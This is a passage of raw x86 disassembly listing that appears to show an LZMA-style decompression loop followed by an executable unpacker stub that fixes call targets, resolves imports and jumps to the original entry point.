  6be3ec:	mov    dx,WORD PTR [ebp+0x180]
  6be3f3:	movzx  ebp,dx
  6be3f6:	imul   eax,ebp
  6be3f9:	cmp    edi,eax
  6be3fb:	jae    0x6be44f
  6be3fd:	mov    esi,eax
  6be3ff:	mov    eax,0x800
  6be404:	sub    eax,ebp
  6be406:	mov    ebp,DWORD PTR [esp+0x58]
  6be40a:	sar    eax,0x5
  6be40d:	mov    ecx,DWORD PTR [esp+0x54]
  6be411:	lea    eax,[edx+eax*1]
  6be414:	mov    edx,DWORD PTR [esp+0x38]
  6be418:	mov    DWORD PTR [esp+0x50],ecx
  6be41c:	mov    ecx,DWORD PTR [esp+0x78]
  6be420:	mov    WORD PTR [edx+0x180],ax
  6be427:	mov    eax,DWORD PTR [esp+0x5c]
  6be42b:	mov    DWORD PTR [esp+0x54],ebp
  6be42f:	mov    DWORD PTR [esp+0x58],eax
  6be433:	xor    eax,eax
  6be435:	cmp    DWORD PTR [esp+0x60],0x6
  6be43a:	setg   al
  6be43d:	add    ecx,0x664
  6be443:	lea    eax,[eax+eax*2]
  6be446:	mov    DWORD PTR [esp+0x60],eax
  6be44a:	jmp    0x6be6c3
  6be44f:	mov    esi,ecx
  6be451:	sub    edi,eax
  6be453:	sub    esi,eax
  6be455:	mov    eax,edx
  6be457:	shr    ax,0x5
  6be45b:	mov    ecx,DWORD PTR [esp+0x38]
  6be45f:	sub    dx,ax
  6be462:	cmp    esi,0xffffff
  6be468:	mov    WORD PTR [ecx+0x180],dx
  6be46f:	ja     0x6be487
  6be471:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be475:	je     0x6beac8
  6be47b:	movzx  eax,BYTE PTR [ebx]
  6be47e:	shl    edi,0x8
  6be481:	shl    esi,0x8
  6be484:	inc    ebx
  6be485:	or     edi,eax
  6be487:	mov    ebp,DWORD PTR [esp+0x38]
  6be48b:	mov    edx,esi
  6be48d:	shr    edx,0xb
  6be490:	mov    cx,WORD PTR [ebp+0x198]
  6be497:	movzx  eax,cx
  6be49a:	imul   edx,eax
  6be49d:	cmp    edi,edx
  6be49f:	jae    0x6be588
  6be4a5:	mov    ebp,0x800
  6be4aa:	mov    esi,edx
  6be4ac:	sub    ebp,eax
  6be4ae:	mov    DWORD PTR [esp+0x34],0x800
  6be4b6:	mov    eax,ebp
  6be4b8:	sar    eax,0x5
  6be4bb:	lea    eax,[ecx+eax*1]
  6be4be:	mov    ecx,DWORD PTR [esp+0x38]
  6be4c2:	mov    WORD PTR [ecx+0x198],ax
  6be4c9:	mov    eax,DWORD PTR [esp+0x60]
  6be4cd:	mov    ecx,DWORD PTR [esp+0x44]
  6be4d1:	shl    eax,0x5
  6be4d4:	add    eax,DWORD PTR [esp+0x78]
  6be4d8:	cmp    edx,0xffffff
  6be4de:	lea    ebp,[eax+ecx*2]
  6be4e1:	ja     0x6be4f9
  6be4e3:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be4e7:	je     0x6beac8
  6be4ed:	movzx  eax,BYTE PTR [ebx]
  6be4f0:	shl    edi,0x8
  6be4f3:	shl    esi,0x8
  6be4f6:	inc    ebx
  6be4f7:	or     edi,eax
  6be4f9:	mov    dx,WORD PTR [ebp+0x1e0]
  6be500:	mov    eax,esi
  6be502:	shr    eax,0xb
  6be505:	movzx  ecx,dx
  6be508:	imul   eax,ecx
  6be50b:	cmp    edi,eax
  6be50d:	jae    0x6be56f
  6be50f:	sub    DWORD PTR [esp+0x34],ecx
  6be513:	sar    DWORD PTR [esp+0x34],0x5
  6be518:	mov    esi,DWORD PTR [esp+0x34]
  6be51c:	mov    DWORD PTR [esp+0x48],eax
  6be520:	cmp    DWORD PTR [esp+0x74],0x0
  6be525:	lea    eax,[edx+esi*1]
  6be528:	mov    WORD PTR [ebp+0x1e0],ax
  6be52f:	je     0x6beac8
  6be535:	xor    eax,eax
  6be537:	cmp    DWORD PTR [esp+0x60],0x6
  6be53c:	mov    ebp,DWORD PTR [esp+0xa0]
  6be543:	mov    edx,DWORD PTR [esp+0x74]
  6be547:	setg   al
  6be54a:	lea    eax,[eax+eax*1+0x9]
  6be54e:	mov    DWORD PTR [esp+0x60],eax
  6be552:	mov    eax,DWORD PTR [esp+0x74]
  6be556:	sub    eax,DWORD PTR [esp+0x5c]
  6be55a:	mov    al,BYTE PTR [ebp+eax*1+0x0]
  6be55e:	mov    BYTE PTR [esp+0x73],al
  6be562:	mov    BYTE PTR [edx+ebp*1],al
  6be565:	inc    edx
  6be566:	mov    DWORD PTR [esp+0x74],edx
  6be56a:	jmp    0x6beaa0
  6be56f:	sub    esi,eax
  6be571:	sub    edi,eax
  6be573:	mov    eax,edx
  6be575:	shr    ax,0x5
  6be579:	sub    dx,ax
  6be57c:	mov    WORD PTR [ebp+0x1e0],dx
  6be583:	jmp    0x6be6a7
  6be588:	mov    eax,ecx
  6be58a:	sub    esi,edx
  6be58c:	shr    ax,0x5
  6be590:	mov    ebp,DWORD PTR [esp+0x38]
  6be594:	sub    cx,ax
  6be597:	sub    edi,edx
  6be599:	cmp    esi,0xffffff
  6be59f:	mov    WORD PTR [ebp+0x198],cx
  6be5a6:	ja     0x6be5be
  6be5a8:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be5ac:	je     0x6beac8
  6be5b2:	movzx  eax,BYTE PTR [ebx]
  6be5b5:	shl    edi,0x8
  6be5b8:	shl    esi,0x8
  6be5bb:	inc    ebx
  6be5bc:	or     edi,eax
  6be5be:	mov    ecx,DWORD PTR [esp+0x38]
  6be5c2:	mov    eax,esi
  6be5c4:	shr    eax,0xb
  6be5c7:	mov    dx,WORD PTR [ecx+0x1b0]
  6be5ce:	movzx  ecx,dx
  6be5d1:	imul   eax,ecx
  6be5d4:	cmp    edi,eax
  6be5d6:	jae    0x6be5fb
  6be5d8:	mov    esi,eax
  6be5da:	mov    eax,0x800
  6be5df:	sub    eax,ecx
  6be5e1:	mov    ebp,DWORD PTR [esp+0x38]
  6be5e5:	sar    eax,0x5
  6be5e8:	lea    eax,[edx+eax*1]
  6be5eb:	mov    WORD PTR [ebp+0x1b0],ax
  6be5f2:	mov    eax,DWORD PTR [esp+0x58]
  6be5f6:	jmp    0x6be69b
  6be5fb:	mov    ecx,esi
  6be5fd:	sub    edi,eax
  6be5ff:	sub    ecx,eax
  6be601:	mov    eax,edx
  6be603:	shr    ax,0x5
  6be607:	sub    dx,ax
  6be60a:	mov    eax,DWORD PTR [esp+0x38]
  6be60e:	cmp    ecx,0xffffff
  6be614:	mov    WORD PTR [eax+0x1b0],dx
  6be61b:	ja     0x6be633
  6be61d:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be621:	je     0x6beac8
  6be627:	movzx  eax,BYTE PTR [ebx]
  6be62a:	shl    edi,0x8
  6be62d:	shl    ecx,0x8
  6be630:	inc    ebx
  6be631:	or     edi,eax
  6be633:	mov    esi,DWORD PTR [esp+0x38]
  6be637:	mov    eax,ecx
  6be639:	shr    eax,0xb
  6be63c:	mov    dx,WORD PTR [esi+0x1c8]
  6be643:	movzx  ebp,dx
  6be646:	imul   eax,ebp
  6be649:	cmp    edi,eax
  6be64b:	jae    0x6be66d
  6be64d:	mov    esi,eax
  6be64f:	mov    eax,0x800
  6be654:	sub    eax,ebp
  6be656:	mov    ebp,DWORD PTR [esp+0x38]
  6be65a:	sar    eax,0x5
  6be65d:	lea    eax,[edx+eax*1]
  6be660:	mov    WORD PTR [ebp+0x1c8],ax
  6be667:	mov    eax,DWORD PTR [esp+0x54]
  6be66b:	jmp    0x6be693
  6be66d:	mov    esi,ecx
  6be66f:	sub    edi,eax
  6be671:	sub    esi,eax
  6be673:	mov    eax,edx
  6be675:	shr    ax,0x5
  6be679:	sub    dx,ax
  6be67c:	mov    eax,DWORD PTR [esp+0x38]
  6be680:	mov    WORD PTR [eax+0x1c8],dx
  6be687:	mov    edx,DWORD PTR [esp+0x54]
  6be68b:	mov    eax,DWORD PTR [esp+0x50]
  6be68f:	mov    DWORD PTR [esp+0x50],edx
  6be693:	mov    ecx,DWORD PTR [esp+0x58]
  6be697:	mov    DWORD PTR [esp+0x54],ecx
  6be69b:	mov    ebp,DWORD PTR [esp+0x5c]
  6be69f:	mov    DWORD PTR [esp+0x5c],eax
  6be6a3:	mov    DWORD PTR [esp+0x58],ebp
  6be6a7:	xor    eax,eax
  6be6a9:	cmp    DWORD PTR [esp+0x60],0x6
  6be6ae:	mov    ecx,DWORD PTR [esp+0x78]
  6be6b2:	setg   al
  6be6b5:	add    ecx,0xa68
  6be6bb:	lea    eax,[eax+eax*2+0x8]
  6be6bf:	mov    DWORD PTR [esp+0x60],eax
  6be6c3:	cmp    esi,0xffffff
  6be6c9:	ja     0x6be6e1
  6be6cb:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be6cf:	je     0x6beac8
  6be6d5:	movzx  eax,BYTE PTR [ebx]
  6be6d8:	shl    edi,0x8
  6be6db:	shl    esi,0x8
  6be6de:	inc    ebx
  6be6df:	or     edi,eax
  6be6e1:	mov    dx,WORD PTR [ecx]
  6be6e4:	mov    eax,esi
  6be6e6:	shr    eax,0xb
  6be6e9:	movzx  ebp,dx
  6be6ec:	imul   eax,ebp
  6be6ef:	cmp    edi,eax
  6be6f1:	jae    0x6be722
  6be6f3:	mov    DWORD PTR [esp+0x48],eax
  6be6f7:	mov    eax,0x800
  6be6fc:	sub    eax,ebp
  6be6fe:	shl    DWORD PTR [esp+0x44],0x4
  6be703:	sar    eax,0x5
  6be706:	mov    DWORD PTR [esp+0x2c],0x0
  6be70e:	lea    eax,[edx+eax*1]
  6be711:	mov    WORD PTR [ecx],ax
  6be714:	mov    eax,DWORD PTR [esp+0x44]
  6be718:	lea    ecx,[ecx+eax*1+0x4]
  6be71c:	mov    DWORD PTR [esp+0x10],ecx
  6be720:	jmp    0x6be794
  6be722:	sub    esi,eax
  6be724:	sub    edi,eax
  6be726:	mov    eax,edx
  6be728:	shr    ax,0x5
  6be72c:	sub    dx,ax
  6be72f:	cmp    esi,0xffffff
  6be735:	mov    WORD PTR [ecx],dx
  6be738:	ja     0x6be750
  6be73a:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be73e:	je     0x6beac8
  6be744:	movzx  eax,BYTE PTR [ebx]
  6be747:	shl    edi,0x8
  6be74a:	shl    esi,0x8
  6be74d:	inc    ebx
  6be74e:	or     edi,eax
  6be750:	mov    dx,WORD PTR [ecx+0x2]
  6be754:	mov    eax,esi
  6be756:	shr    eax,0xb
  6be759:	movzx  ebp,dx
  6be75c:	imul   eax,ebp
  6be75f:	cmp    edi,eax
  6be761:	jae    0x6be79e
  6be763:	mov    DWORD PTR [esp+0x48],eax
  6be767:	mov    eax,0x800
  6be76c:	sub    eax,ebp
  6be76e:	shl    DWORD PTR [esp+0x44],0x4
  6be773:	sar    eax,0x5
  6be776:	mov    DWORD PTR [esp+0x2c],0x8
  6be77e:	lea    eax,[edx+eax*1]
  6be781:	mov    edx,DWORD PTR [esp+0x44]
  6be785:	mov    WORD PTR [ecx+0x2],ax
  6be789:	lea    ecx,[ecx+edx*1+0x104]
  6be790:	mov    DWORD PTR [esp+0x10],ecx
  6be794:	mov    DWORD PTR [esp+0x30],0x3
  6be79c:	jmp    0x6be7cd
  6be79e:	sub    esi,eax
  6be7a0:	sub    edi,eax
  6be7a2:	mov    eax,edx
  6be7a4:	mov    DWORD PTR [esp+0x48],esi
  6be7a8:	shr    ax,0x5
  6be7ac:	mov    DWORD PTR [esp+0x2c],0x10
  6be7b4:	sub    dx,ax
  6be7b7:	mov    DWORD PTR [esp+0x30],0x8
  6be7bf:	mov    WORD PTR [ecx+0x2],dx
  6be7c3:	add    ecx,0x204
  6be7c9:	mov    DWORD PTR [esp+0x10],ecx
  6be7cd:	mov    ecx,DWORD PTR [esp+0x30]
  6be7d1:	mov    edx,0x1
  6be7d6:	mov    DWORD PTR [esp+0x28],ecx
  6be7da:	lea    ebp,[edx+edx*1]
  6be7dd:	mov    esi,DWORD PTR [esp+0x10]
  6be7e1:	add    esi,ebp
  6be7e3:	cmp    DWORD PTR [esp+0x48],0xffffff
  6be7eb:	ja     0x6be805
  6be7ed:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be7f1:	je     0x6beac8
  6be7f7:	shl    DWORD PTR [esp+0x48],0x8
  6be7fc:	movzx  eax,BYTE PTR [ebx]
  6be7ff:	shl    edi,0x8
  6be802:	inc    ebx
  6be803:	or     edi,eax
  6be805:	mov    eax,DWORD PTR [esp+0x48]
  6be809:	mov    dx,WORD PTR [esi]
  6be80c:	shr    eax,0xb
  6be80f:	movzx  ecx,dx
  6be812:	imul   eax,ecx
  6be815:	cmp    edi,eax
  6be817:	jae    0x6be831
  6be819:	mov    DWORD PTR [esp+0x48],eax
  6be81d:	mov    eax,0x800
  6be822:	sub    eax,ecx
  6be824:	sar    eax,0x5
  6be827:	lea    eax,[edx+eax*1]
  6be82a:	mov    edx,ebp
  6be82c:	mov    WORD PTR [esi],ax
  6be82f:	jmp    0x6be846
  6be831:	sub    DWORD PTR [esp+0x48],eax
  6be835:	sub    edi,eax
  6be837:	mov    eax,edx
  6be839:	shr    ax,0x5
  6be83d:	sub    dx,ax
  6be840:	mov    WORD PTR [esi],dx
  6be843:	lea    edx,[ebp+0x1]
  6be846:	mov    esi,DWORD PTR [esp+0x28]
  6be84a:	dec    esi
  6be84b:	mov    DWORD PTR [esp+0x28],esi
  6be84f:	jne    0x6be7da
  6be851:	mov    cl,BYTE PTR [esp+0x30]
  6be855:	mov    eax,0x1
  6be85a:	shl    eax,cl
  6be85c:	sub    edx,eax
  6be85e:	add    edx,DWORD PTR [esp+0x2c]
  6be862:	cmp    DWORD PTR [esp+0x60],0x3
  6be867:	mov    DWORD PTR [esp+0xc],edx
  6be86b:	jg     0x6bea58
  6be871:	add    DWORD PTR [esp+0x60],0x7
  6be876:	cmp    edx,0x3
  6be879:	mov    eax,edx
  6be87b:	jle    0x6be882
  6be87d:	mov    eax,0x3
  6be882:	mov    esi,DWORD PTR [esp+0x78]
  6be886:	shl    eax,0x7
  6be889:	mov    DWORD PTR [esp+0x24],0x6
  6be891:	lea    eax,[esi+eax*1+0x360]
  6be898:	mov    DWORD PTR [esp+0x8],eax
  6be89c:	mov    eax,0x1
  6be8a1:	lea    ebp,[eax+eax*1]
  6be8a4:	mov    esi,DWORD PTR [esp+0x8]
  6be8a8:	add    esi,ebp
  6be8aa:	cmp    DWORD PTR [esp+0x48],0xffffff
  6be8b2:	ja     0x6be8cc
  6be8b4:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be8b8:	je     0x6beac8
  6be8be:	shl    DWORD PTR [esp+0x48],0x8
  6be8c3:	movzx  eax,BYTE PTR [ebx]
  6be8c6:	shl    edi,0x8
  6be8c9:	inc    ebx
  6be8ca:	or     edi,eax
  6be8cc:	mov    eax,DWORD PTR [esp+0x48]
  6be8d0:	mov    dx,WORD PTR [esi]
  6be8d3:	shr    eax,0xb
  6be8d6:	movzx  ecx,dx
  6be8d9:	imul   eax,ecx
  6be8dc:	cmp    edi,eax
  6be8de:	jae    0x6be8f8
  6be8e0:	mov    DWORD PTR [esp+0x48],eax
  6be8e4:	mov    eax,0x800
  6be8e9:	sub    eax,ecx
  6be8eb:	sar    eax,0x5
  6be8ee:	lea    eax,[edx+eax*1]
  6be8f1:	mov    WORD PTR [esi],ax
  6be8f4:	mov    eax,ebp
  6be8f6:	jmp    0x6be90d
  6be8f8:	sub    DWORD PTR [esp+0x48],eax
  6be8fc:	sub    edi,eax
  6be8fe:	mov    eax,edx
  6be900:	shr    ax,0x5
  6be904:	sub    dx,ax
  6be907:	lea    eax,[ebp+0x1]
  6be90a:	mov    WORD PTR [esi],dx
  6be90d:	mov    ebp,DWORD PTR [esp+0x24]
  6be911:	dec    ebp
  6be912:	mov    DWORD PTR [esp+0x24],ebp
  6be916:	jne    0x6be8a1
  6be918:	lea    edx,[eax-0x40]
  6be91b:	cmp    edx,0x3
  6be91e:	mov    DWORD PTR [esp],edx
  6be921:	jle    0x6bea4e
  6be927:	mov    eax,edx
  6be929:	mov    esi,edx
  6be92b:	sar    eax,1
  6be92d:	and    esi,0x1
  6be930:	lea    ecx,[eax-0x1]
  6be933:	or     esi,0x2
  6be936:	cmp    edx,0xd
  6be939:	mov    DWORD PTR [esp+0x20],ecx
  6be93d:	jg     0x6be95b
  6be93f:	mov    ebp,DWORD PTR [esp+0x78]
  6be943:	shl    esi,cl
  6be945:	add    edx,edx
  6be947:	mov    DWORD PTR [esp],esi
  6be94a:	lea    eax,[ebp+esi*2+0x0]
  6be94e:	sub    eax,edx
  6be950:	add    eax,0x55e
  6be955:	mov    DWORD PTR [esp+0x4],eax
  6be959:	jmp    0x6be9b1
  6be95b:	lea    edx,[eax-0x5]
  6be95e:	cmp    DWORD PTR [esp+0x48],0xffffff
  6be966:	ja     0x6be980
  6be968:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be96c:	je     0x6beac8
  6be972:	shl    DWORD PTR [esp+0x48],0x8
  6be977:	movzx  eax,BYTE PTR [ebx]
  6be97a:	shl    edi,0x8
  6be97d:	inc    ebx
  6be97e:	or     edi,eax
  6be980:	shr    DWORD PTR [esp+0x48],1
  6be984:	add    esi,esi
  6be986:	cmp    edi,DWORD PTR [esp+0x48]
  6be98a:	jb     0x6be993
  6be98c:	sub    edi,DWORD PTR [esp+0x48]
  6be990:	or     esi,0x1
  6be993:	dec    edx
  6be994:	jne    0x6be95e
  6be996:	mov    eax,DWORD PTR [esp+0x78]
  6be99a:	shl    esi,0x4
  6be99d:	mov    DWORD PTR [esp],esi
  6be9a0:	add    eax,0x644
  6be9a5:	mov    DWORD PTR [esp+0x20],0x4
  6be9ad:	mov    DWORD PTR [esp+0x4],eax
  6be9b1:	mov    DWORD PTR [esp+0x1c],0x1
  6be9b9:	mov    eax,0x1
  6be9be:	mov    ebp,DWORD PTR [esp+0x4]
  6be9c2:	add    eax,eax
  6be9c4:	mov    DWORD PTR [esp+0x18],eax
  6be9c8:	add    ebp,eax
  6be9ca:	cmp    DWORD PTR [esp+0x48],0xffffff
  6be9d2:	ja     0x6be9ec
  6be9d4:	cmp    ebx,DWORD PTR [esp+0x4c]
  6be9d8:	je     0x6beac8
  6be9de:	shl    DWORD PTR [esp+0x48],0x8
  6be9e3:	movzx  eax,BYTE PTR [ebx]
  6be9e6:	shl    edi,0x8
  6be9e9:	inc    ebx
  6be9ea:	or     edi,eax
  6be9ec:	mov    eax,DWORD PTR [esp+0x48]
  6be9f0:	mov    dx,WORD PTR [ebp+0x0]
  6be9f4:	shr    eax,0xb
  6be9f7:	movzx  esi,dx
  6be9fa:	imul   eax,esi
  6be9fd:	cmp    edi,eax
  6be9ff:	jae    0x6bea1c
  6bea01:	mov    DWORD PTR [esp+0x48],eax
  6bea05:	mov    eax,0x800
  6bea0a:	sub    eax,esi
  6bea0c:	sar    eax,0x5
  6bea0f:	lea    eax,[edx+eax*1]
  6bea12:	mov    WORD PTR [ebp+0x0],ax
  6bea16:	mov    eax,DWORD PTR [esp+0x18]
  6bea1a:	jmp    0x6bea3b
  6bea1c:	sub    DWORD PTR [esp+0x48],eax
  6bea20:	sub    edi,eax
  6bea22:	mov    eax,edx
  6bea24:	shr    ax,0x5
  6bea28:	sub    dx,ax
  6bea2b:	mov    eax,DWORD PTR [esp+0x18]
  6bea2f:	mov    WORD PTR [ebp+0x0],dx
  6bea33:	mov    edx,DWORD PTR [esp+0x1c]
  6bea37:	inc    eax
  6bea38:	or     DWORD PTR [esp],edx
  6bea3b:	mov    ecx,DWORD PTR [esp+0x20]
  6bea3f:	shl    DWORD PTR [esp+0x1c],1
  6bea43:	dec    ecx
  6bea44:	mov    DWORD PTR [esp+0x20],ecx
  6bea48:	jne    0x6be9be
  6bea4e:	mov    esi,DWORD PTR [esp]
  6bea51:	inc    esi
  6bea52:	mov    DWORD PTR [esp+0x5c],esi
  6bea56:	je     0x6beab1
  6bea58:	mov    ecx,DWORD PTR [esp+0xc]
  6bea5c:	mov    ebp,DWORD PTR [esp+0x74]
  6bea60:	add    ecx,0x2
  6bea63:	cmp    DWORD PTR [esp+0x5c],ebp
  6bea67:	ja     0x6beac8
  6bea69:	mov    eax,DWORD PTR [esp+0xa0]
  6bea70:	mov    edx,ebp
  6bea72:	sub    eax,DWORD PTR [esp+0x5c]
  6bea76:	add    edx,DWORD PTR [esp+0xa0]
  6bea7d:	lea    esi,[eax+ebp*1]
  6bea80:	mov    al,BYTE PTR [esi]
  6bea82:	inc    esi
  6bea83:	mov    BYTE PTR [esp+0x73],al
  6bea87:	mov    BYTE PTR [edx],al
  6bea89:	inc    edx
  6bea8a:	inc    DWORD PTR [esp+0x74]
  6bea8e:	dec    ecx
  6bea8f:	je     0x6beaa0
  6bea91:	mov    ebp,DWORD PTR [esp+0xa4]
  6bea98:	cmp    DWORD PTR [esp+0x74],ebp
  6bea9c:	jb     0x6bea80
  6bea9e:	jmp    0x6beab1
  6beaa0:	mov    eax,DWORD PTR [esp+0xa4]
  6beaa7:	cmp    DWORD PTR [esp+0x74],eax
  6beaab:	jb     0x6be16c
  6beab1:	cmp    DWORD PTR [esp+0x48],0xffffff
  6beab9:	ja     0x6bead0
  6beabb:	cmp    ebx,DWORD PTR [esp+0x4c]
  6beabf:	mov    eax,0x1
  6beac4:	je     0x6beaef
  6beac6:	jmp    0x6beacf
  6beac8:	mov    eax,0x1
  6beacd:	jmp    0x6beaef
  6beacf:	inc    ebx
  6bead0:	sub    ebx,DWORD PTR [esp+0x94]
  6bead7:	xor    eax,eax
  6bead9:	mov    edx,DWORD PTR [esp+0x9c]
  6beae0:	mov    ecx,DWORD PTR [esp+0x74]
  6beae4:	mov    DWORD PTR [edx],ebx
  6beae6:	mov    ebx,DWORD PTR [esp+0xa8]
  6beaed:	mov    DWORD PTR [ebx],ecx
  6beaef:	add    esp,0x7c
  6beaf2:	pop    ebx
  6beaf3:	pop    esi
  6beaf4:	pop    edi
  6beaf5:	pop    ebp
  6beaf6:	add    esi,DWORD PTR [ebx-0x4]
  6beaf9:	add    edi,DWORD PTR [ebx-0x8]
  6beafc:	xor    eax,eax
  6beafe:	lea    ecx,[esp-0x100]
  6beb05:	mov    esp,ebp
  6beb07:	push   eax
  6beb08:	cmp    esp,ecx
  6beb0a:	jne    0x6beb07
  6beb0c:	mov    esp,ebp
  6beb0e:	xor    ecx,ecx
  6beb10:	pop    esi
  6beb11:	mov    edi,esi
  6beb13:	mov    ecx,0x2b07ae
  6beb18:	mov    al,0xe8
  6beb1a:	repnz scas al,BYTE PTR es:[edi]
  6beb1c:	jne    0x6beb35
  6beb1e:	cmp    BYTE PTR [edi],0xae
  6beb21:	jne    0x6beb1a
  6beb23:	mov    eax,DWORD PTR [edi]
  6beb25:	shr    ax,0x8
  6beb29:	rol    eax,0x10
  6beb2c:	xchg   ah,al
  6beb2e:	sub    eax,edi
  6beb30:	add    eax,esi
  6beb32:	stos   DWORD PTR es:[edi],eax
  6beb33:	jmp    0x6beb18
  6beb35:	lea    edi,[esi+0x2bc000]
  6beb3b:	mov    eax,DWORD PTR [edi]
  6beb3d:	or     eax,eax
  6beb3f:	je     0x6beb86
  6beb41:	mov    ebx,DWORD PTR [edi+0x4]
  6beb44:	lea    eax,[eax+esi*1+0x2c09ac]
  6beb4b:	add    ebx,esi
  6beb4d:	push   eax
  6beb4e:	add    edi,0x8
  6beb51:	call   DWORD PTR [esi+0x2c09e8]
  6beb57:	xchg   ebp,eax
  6beb58:	mov    al,BYTE PTR [edi]
  6beb5a:	inc    edi
  6beb5b:	or     al,al
  6beb5d:	je     0x6beb3b
  6beb5f:	mov    ecx,edi
  6beb61:	jns    0x6beb6a
  6beb63:	movzx  eax,WORD PTR [edi]
  6beb66:	inc    edi
  6beb67:	push   eax
  6beb68:	inc    edi
  6beb69:	mov    ecx,0xaef24857
  6beb6e:	push   ebp
  6beb6f:	call   DWORD PTR [esi+0x2c09ec]
  6beb75:	or     eax,eax
  6beb77:	je     0x6beb80
  6beb79:	mov    DWORD PTR [ebx],eax
  6beb7b:	add    ebx,0x4
  6beb7e:	jmp    0x6beb58
  6beb80:	call   DWORD PTR [esi+0x2c09fc]
  6beb86:	mov    ebp,DWORD PTR [esi+0x2c09f0]
  6beb8c:	lea    edi,[esi-0x1000]
  6beb92:	mov    ebx,0x1000
  6beb97:	push   eax
  6beb98:	push   esp
  6beb99:	push   0x4
  6beb9b:	push   ebx
  6beb9c:	push   edi
  6beb9d:	call   ebp
  6beb9f:	lea    eax,[edi+0x1d7]
  6beba5:	and    BYTE PTR [eax],0x7f
  6beba8:	and    BYTE PTR [eax+0x28],0x7f
  6bebac:	pop    eax
  6bebad:	push   eax
  6bebae:	push   esp
  6bebaf:	push   eax
  6bebb0:	push   ebx
  6bebb1:	push   edi
  6bebb2:	call   ebp
  6bebb4:	pop    eax
  6bebb5:	popa   
  6bebb6:	lea    eax,[esp-0x80]
  6bebba:	push   0x0
  6bebbc:	cmp    esp,eax
  6bebbe:	jne    0x6bebba
  6bebc0:	sub    esp,0xffffff80
  6bebc3:	jmp    0x401810
	...
